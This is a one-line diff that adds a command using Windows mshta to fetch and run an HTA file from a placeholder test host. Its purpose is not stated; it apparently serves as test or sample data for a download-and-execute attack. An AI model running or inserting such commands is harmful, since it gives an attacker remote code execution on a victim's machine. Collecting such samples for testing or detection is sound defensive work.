@@ -1,0 +1,1 @@
+mshta http://xb3-example.test/x.hta
